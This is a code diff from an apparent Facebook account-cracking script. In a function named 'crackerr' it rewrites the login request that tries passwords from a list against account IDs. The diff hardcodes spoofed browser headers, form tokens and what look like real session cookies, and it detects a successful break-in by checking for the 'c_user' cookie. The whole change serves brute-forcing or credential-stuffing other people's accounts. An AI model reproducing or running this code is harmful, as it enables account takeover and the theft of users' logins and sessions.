@@ -497,35 +497,52 @@ def crackerr(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"}
             requu1 = session.get(url1,headers=head)
-            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
-            headers = {"authority": "www.facebook.com",
-            "method": "POST",
-            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
-            "scheme": "https",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "content-type": "application/x-www-form-urlencoded",
-            "dpr": "3",
-            "origin": "https://www.facebook.com",
-            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-model": "\"\"",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-ch-ua-platform-version": "\"\"",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-           "sec-fetch-site": "same-origin",
-           "sec-fetch-user": "?1",
-           "upgrade-insecure-requests": "1",
-           "user-agent": us,
-           "viewport-width": "980"}
-            response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            log_data = {
+            "email": ids,
+            "cuid": "",
+            "guid": "f9e951a603b77bd2f",
+            "lgnjs": "1735326656",
+            "lgnrnd": "111054_r681",
+            "locale": "hi_IN",
+            "login_source": "comet_login_header",
+            "next_url": "https://www.facebook.com/login&lwc=1348028",
+            "skstamp": "",
+            "timezone": "-330",
+            "prefill_contact_point": "",
+            "prefill_source": "",
+            "lsd": re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            "lgndim": '{"w":1440,"h":900,"aw":1440,"ah":860,"c":24}',
+            "ab_test_data": "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJS/JSJAAABFAD",
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnbvNl.AWWi4T6PozE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'ps_l': '1',
+            'ps_n': '1',
+            'wd': '1440x402',
+            'locale': 'hi_IN',}
+            headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'www.facebook.com',
+            'Connection': 'keep-alive',
+            'Referer': 'https://www.facebook.com/login&lwc=1348028',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1"
+            response = session.post(url,data=log_data,cookies=cookies,headers=headers,allow_redirects=False)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
